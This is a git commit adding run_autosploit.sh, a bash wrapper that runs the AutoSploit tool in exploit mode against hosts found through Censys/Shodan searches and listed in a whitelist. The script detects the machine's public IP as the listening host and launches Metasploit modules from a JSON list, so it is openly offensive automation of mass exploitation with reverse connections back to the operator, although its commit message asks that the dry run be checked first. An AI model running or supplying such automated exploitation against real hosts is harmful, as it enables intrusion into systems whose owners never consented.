697e05ab06d7e555eb23db6a3869c89e38a3f0a8
selora <selora@selora.com>
2018-04-09 11:24:58 -0400

    Scripts to automate autosploit. ./dryrun_autosploit.sh will search censys/shodan/etc and do a dry-run against discovered hosts that are in the whitelist. VALIDATE THE DRYRUN REPORT BEFORE LAUNCHING THE ACTUAL EXPLOIT RUN ./run_autosploit.sh will run autosploit in exploit mode against previously discovered hosts in the whitelist.

---
+++ run_autosploit.sh
@@ -0,0 +1,16 @@
+#!/usr/bin/env bash
+
+
+if [[ $# -lt 2 ]]; then
+    echo "Syntax:"
+    echo -e "\t./run_autosploit.sh <whitelist.txt> <exposed_lport>"
+	exit 1
+fi
+
+WHITELIST=$1
+LPORT=$2
+
+LHOST=`dig +short @resolver1.opendns.com myip.opendns.com`
+TIMESTAMP=`date +%s`
+
+python autosploit.py --whitelist $WHITELIST -e -C "msf_autorun_${TIMESTAMP}" $LHOST $LPORT -f etc/json/other_modules.json
